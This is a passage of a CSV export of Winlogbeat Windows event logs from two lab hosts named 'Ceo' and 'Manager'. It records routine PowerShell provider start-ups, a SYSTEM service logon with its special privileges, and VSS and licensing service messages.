"Oct 23, 2022 @ 17:10:15.201",VXkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.640","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4603,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.201",VnkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.640","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4604,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.201",V3kbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.640","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4605,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.201",WHkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.641","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4606,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:54.414",y3kbBIQByII7dpeEFzJt,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 17:09:55.359","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4782,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:54.402",zHkbBIQByII7dpeEGzJo,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:09:56.384","Oct 23, 2022 @ 17:09:56.193",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31204,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:09:54.402",zXkbBIQByII7dpeEGzJo,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:09:56.384","Oct 23, 2022 @ 17:09:56.195",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31205,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:46.561",hHkaBIQByII7dpeE9zKW,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",8224,"Oct 23, 2022 @ 17:09:47.204","-",event,"-",VSS,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"The VSS service is shutting down due to idle timeout. ","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-",2D20436F64653A2020434F525356434330303030303737342D2043616C6C3A2020434F525356434330303030303735362D205049443A202030303030323338302D205449443A202030303030333031362D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8224,Classic,"-","-","-","-","-",Info,"-","-","-",VSS,4781,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.812",gnkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=a4a47c1d-0ad6-4ac9-a866-38d815d7e393
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=a4a47c1d-0ad6-4ac9-a866-38d815d7e393
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4600,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.796",fXkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4595,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.796",fnkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4596,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.796",f3kaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4597,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.796",gHkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4598,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.796",gXkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.255","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4599,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:09:45.765",fHkaBIQByII7dpeE8zL5,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:09:46.252","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

